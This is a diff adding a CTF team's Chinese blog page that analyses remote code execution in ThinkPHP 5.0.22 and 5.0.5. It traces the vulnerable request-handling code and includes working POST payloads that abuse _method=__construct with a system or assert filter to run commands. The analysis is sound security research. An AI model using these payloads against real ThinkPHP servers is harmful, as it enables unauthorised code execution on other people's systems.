@@ -1,0 +1,251 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>thinkphp5.x-RCE分析 | kn0ck&#39;s blog | 一群CTF爱好者</title>
+
+  
+  <meta name="author" content="kn0ck Team">
+  
+
+  
+  <meta name="description" content="kn0ck战队成立于2017年9月，是由一群来自全国各地的网络爱好者组成，战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。作为一支新兴CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。">
+  
+
+  
+  <meta name="keywords" content="CTF,kn0ck,网络安全,web,pwn,夺旗赛">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="thinkphp5.x-RCE分析">
+
+  <meta property="og:site_name" content="kn0ck&#39;s blog">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="kn0ck&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">kn0ck&#39;s blog</a>
+    </h1>
+    <p class="site-description">一群CTF爱好者</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/about">关于</a></li>
+      
+        <li><a href="/author">队员</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>thinkphp5.x-RCE分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/02/01/thinkphp5-x-RCE/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-02-01T13:03:28.000Z">
+          2019-02-01
+        </time>
+      </a>
+    </span>
+    
+    <span class="posted-on">
+      <a href="/2019/02/01/thinkphp5-x-RCE/" rel="bookmark">
+        
+          p0desta
+        
+
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h4 id="thinkphp5-0-22"><a href="#thinkphp5-0-22" class="headerlink" title="thinkphp5.0.22"></a>thinkphp5.0.22</h4><p>开debug模式,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.22/public/</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<p>关debug模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>断点我直接下在了最后的RCE的地方,首先看一下调用堆栈</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzpot17mzxj30l40fejtm.jpg" alt></p>
+<p>在这个调用堆栈里其实少了一个关键的一次调用,从<code>routeCheck</code>到<code>$method = strtolower($request-&gt;method());</code>这个地方,</p>
+<p>先看一下这个地方</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzppfxxk0xj30y40d8dj4.jpg" alt></p>
+<p>在<code>request.php</code>526行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>
+
+<p>在<code>think\config\app.php</code>中可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表单请求类型伪装变量</span><br><span class="line">&apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br></pre></td></tr></table></figure>
+
+<p>那么我我们可以通过传递<code>_method</code>参数,然后进入<code>$this-&gt;{$this-&gt;method}($_POST);</code>调用Request类中的任意方法,<code>$_POST</code>就是传入的参数,也就是说可以实现任意方法任意参数的调用,继续看构造函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$options=&gt;$_POST</code>,然后判断类中是否有这个属性,如果有即赋值</p>
+<p>继续往下走,通过<code>$data = *self*::exec($dispatch, $config);</code>,因为<code>type=method</code>进入到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'method'</span>: <span class="comment">// 回调方法</span></span><br><span class="line">    $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">    $data = <span class="keyword">self</span>::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后进入到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">    $method = $this-&gt;method(true);</span><br></pre></td></tr></table></figure>
+
+<p>这里还是会进入到method方法,但是这次为true，进入的分支不同,然后进入到server方法,接着</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);</span><br></pre></td></tr></table></figure>
+
+<p>进入到input方法,断点停在了<code>$this-&gt;filterValue($data, $name, $filter);</code>但是往上看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = $this-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure>
+
+<p>有个赋值的操作,跟进看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为一开始<code>filter</code>变量被我们覆盖成了<code>system</code>,所以没影响,最后进入到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure>
+
+<p>但是到这里发现了问题,<code>$value</code>不对,想一下为什么不对,原因是我把断点下在了RCE的地方,但是呢第一次调用就停了,RCE的地方还得往下走,继续回到<code>param</code>方法,将当前请求参数和URL地址中的参数合并</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当前请求参数和URL地址中的参数合并</span><br><span class="line">$this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure>
+
+<p>执行到最后再次进入input方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure>
+
+<p>这次<code>data</code>是数组,进入与刚才不一样的分支</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>array_walk_recursive</code>函数会对数组中的成员递归的调用<code>filterValue</code>,进入到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = call_user_func($filter, $value); //$filter:system  $value:whoami</span><br></pre></td></tr></table></figure>
+
+<p>然后解释一下为什么路由要有<code>s=captcha</code>,<code>vendor/think-captcha/src/helper.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\think\Route::get(<span class="string">'captcha/[:id]'</span>, <span class="string">"\\think\\captcha\\CaptchaController@index"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到对应的路有信息,然后在route.php的1513-1519行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#125; elseif (false !== strpos($route, &apos;\\&apos;)) &#123;</span><br><span class="line">    // 路由到方法</span><br><span class="line">    list($path, $var) = self::parseUrlPath($route);</span><br><span class="line">    $route            = str_replace(&apos;/&apos;, &apos;@&apos;, implode(&apos;/&apos;, $path));</span><br><span class="line">    $method           = strpos($route, &apos;@&apos;) ? explode(&apos;@&apos;, $route) : $route;</span><br><span class="line">    $result           = [&apos;type&apos; =&gt; &apos;method&apos;, &apos;method&apos; =&gt; $method, &apos;var&apos; =&gt; $var];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到规则,因此type为mehod。</p>
+<h4 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h4><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.5/public/</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;method=GET&amp;get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>看下调用堆栈</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqwzllxivj30k60bejsz.jpg" alt></p>
+<p>前面到调用Request类中的任意方法的过程是一样的,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filter[]=assert</span><br><span class="line">get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>因为默认开着debug,进入到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (self::$debug) &#123;</span><br><span class="line">    Log::record(&apos;[ ROUTE ] &apos; . var_export($dispatch, true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ HEADER ] &apos; . var_export($request-&gt;header(), true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ PARAM ] &apos; . var_export($request-&gt;param(), true), &apos;info&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$request-&gt;param</code>中,然后到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = array_merge(<span class="keyword">$this</span>-&gt;param, $file);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为上面请求了method为GET,那么会先将参数合并,然后进入input</p>
+<p>这里因为上面赋值操作也让<code>get</code>为<code>system(&#39;whoami&#39;)</code>,</p>
+<p>继续进入input中</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqyaqlxx1j314k0hkgp9.jpg" alt></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/web/">web</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/代码审计/">代码审计</a>
+    </span>
+    
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+	<section id="comment" class="comment">
+		<div id="vcomments"></div>
+	</section>
+	<!-- LeanCloud -->
+	<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.10.0/dist/av-min.js"></script>
+	<!-- Valine -->
+	<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+	<script>
+		new Valine({
+			el: '#vcomments',
+			appId: '86EMltAutxkr1IaqhOo0dP7l-gzGzoHsz',
+			appKey: 'kdJzexN5shKVeTpQx49IQDaH'
+		})
+	</script>
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 kn0ck Team
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
